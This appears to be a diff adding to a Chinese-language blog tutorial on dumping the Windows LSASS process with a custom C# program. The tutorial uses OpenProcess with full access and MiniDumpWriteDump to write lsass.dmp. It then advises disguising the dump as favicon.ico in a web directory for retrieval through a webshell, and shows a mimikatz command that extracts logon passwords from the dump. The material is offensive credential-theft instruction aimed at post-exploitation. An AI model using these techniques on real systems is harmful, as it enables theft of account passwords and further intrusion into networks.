@@ -59,3 +59,44 @@ int lsass_pid = lsass[0].Id;
 使用Process方法的时候需要引入Diagnostics
 
 ![image-20210811174541665](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210811174541665.png)
+
+使用Win32 OpenProcess来获取Lsass
+
+![image-20210811174944360](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210811174944360.png)
+
+```
+static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+```
+
+然后我们提供完整的访问参数
+
+![image-20210811190434296](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210811190434296.png)
+
+最后设置需要输出的这个文件,这里选择使用Win32 CreateFile这个API
+
+实例化FileStream对象，必须提供两个参数:文件名(lsass.dmp)、文件的完整路径和文件模式,这里要加入System.IO命名空间
+
+![image-20210811191125006](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210811191125006.png)
+
+最后调用MiniDumpWriteFile,当向MiniDumpWriteFile加文件句柄时候,要加一个SafeHandle类
+
+```
+bool dumped = MiniDumpWriteDump(handle, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+```
+
+至此结束,完整代码如下
+
+![image-20210811191647971](https://gitee.com/a4m1n/tuchuang/raw/master/pic/image-20210811191647971.png)
+
+通常生成的lsass.dmp的文件一般比较大,只有webshell的时候下载不便,但是可以通过copy的方法,把favicon.ico复制到可以访问到的web目录,然后用wget将其下载本地解密,也可以直接把输出的文件地址改到web服务器的物理路径
+
+
+
+解密方法
+
+```
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit > password.txt
+```
+
+## 0x04
+
